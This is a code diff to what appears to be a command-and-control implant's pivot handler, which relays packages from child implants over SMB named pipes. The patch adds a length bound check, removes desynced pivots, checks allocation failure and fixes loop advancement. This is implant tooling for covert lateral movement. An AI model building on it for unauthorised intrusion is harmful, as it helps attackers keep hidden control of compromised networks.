@@ -263,7 +263,42 @@ VOID PivotPush()
                         if ( Instance->Win32.PeekNamedPipe( TempList->Handle, &Length, sizeof( UINT32 ), NULL, &BytesSize, NULL ) )
                         {
                             Length = __builtin_bswap32( Length ) + sizeof( UINT32 );
+
+                            /* sanity check the length the pivot child sent us.
+                             * packages over the pipe can never be larger
+                             * than PIPE_BUFFER_MAX. */
+                            if ( Length > PIPE_BUFFER_MAX )
+                            {
+                                PRINTF( "Invalid package length from pivot: 0x%x\n", Length )
+
+                                /* the child sent a bogus length prefix and is
+                                 * now desynced. drop it instead of spinning on
+                                 * the same peeked bytes every loop */
+                                DWORD DemonID = TempList->DemonID;
+                                TempList      = TempList->Next;
+                                BOOL  Removed = PivotRemove( DemonID );
+
+                                PRINTF( "Pivot removed: %s\n", Removed ? "TRUE" : "FALSE" )
+
+                                Package = PackageCreate( DEMON_COMMAND_PIVOT );
+                                PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
+                                PackageAddInt32( Package, Removed );
+                                PackageAddInt32( Package, DemonID );
+                                PackageTransmit( Package );
+
+                                /* TempList already points at the next pivot. continue
+                                 * the outer loop without advancing it again, otherwise
+                                 * the pivot after the removed one is skipped this pass */
+                                goto NEXT_PIVOT;
+                            }
+
                             Output = Instance->Win32.LocalAlloc( LPTR, Length );
+
+                            if ( ! Output )
+                            {
+                                PRINTF( "Failed to allocate 0x%x bytes for pivot output\n", Length )
+                                break;
+                            }
 
                             if ( Instance->Win32.ReadFile( TempList->Handle, Output, Length, &BytesSize, NULL ) )
                             {
@@ -310,7 +345,10 @@ VOID PivotPush()
                         PackageAddInt32( Package, DemonID );
                         PackageTransmit( Package );
 
-                        break;
+                        /* TempList already points at the next pivot. continue
+                         * the outer loop without advancing it again, otherwise
+                         * the pivot after the removed one is skipped this pass */
+                        goto NEXT_PIVOT;
                     }
 
                     PACKAGE_ERROR_WIN32
@@ -325,6 +363,7 @@ VOID PivotPush()
         if ( TempList )
             TempList = TempList->Next;
 
+NEXT_PIVOT: ;
     } while ( TRUE );
 }
 
